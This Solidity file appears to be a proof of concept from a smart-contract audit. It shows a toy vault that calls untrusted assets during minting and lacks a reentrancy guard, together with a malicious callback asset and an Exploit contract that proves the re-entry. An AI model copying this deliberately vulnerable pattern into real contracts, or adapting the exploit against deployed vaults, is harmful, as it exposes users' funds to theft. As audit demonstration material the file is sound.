// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ICallbackAsset {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract VaultCore {
    uint256 public rebaseCount;
    uint256 public temporaryImbalance;

    function mintMultiple(address[] calldata assets, uint256[] calldata amounts) external {
        require(assets.length == amounts.length, "length");
        for (uint256 i; i < assets.length; ++i) {
            // The unsupported asset is ignored while pricing, but is still called below.
            if (amounts[i] > 0) temporaryImbalance += amounts[i];
        }
        for (uint256 i; i < assets.length; ++i) {
            ICallbackAsset(assets[i]).transferFrom(msg.sender, address(this), amounts[i]);
        }
        temporaryImbalance = 0;
    }

    function mint(uint256 amount) external {
        // @> Missing reentrancy guard lets an untrusted transferFrom callback re-enter.
        rebaseCount += 1;
        temporaryImbalance += amount;
    }
}

contract CallbackAsset {
    VaultCore public immutable vault;
    bool public calledBack;

    constructor(VaultCore vault_) { vault = vault_; }

    function transferFrom(address, address, uint256) external returns (bool) {
        calledBack = true;
        vault.mint(1);
        return true;
    }
}

contract Exploit {
    event Proof(uint256 rebaseCount, uint256 imbalance);

    function run() external {
        VaultCore vault = new VaultCore();
        CallbackAsset asset = new CallbackAsset(vault);
        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        assets[0] = address(asset);
        amounts[0] = 1;
        vault.mintMultiple(assets, amounts);
        emit Proof(vault.rebaseCount(), vault.temporaryImbalance());
        require(asset.calledBack() && vault.rebaseCount() == 1, "callback did not re-enter");
    }
}
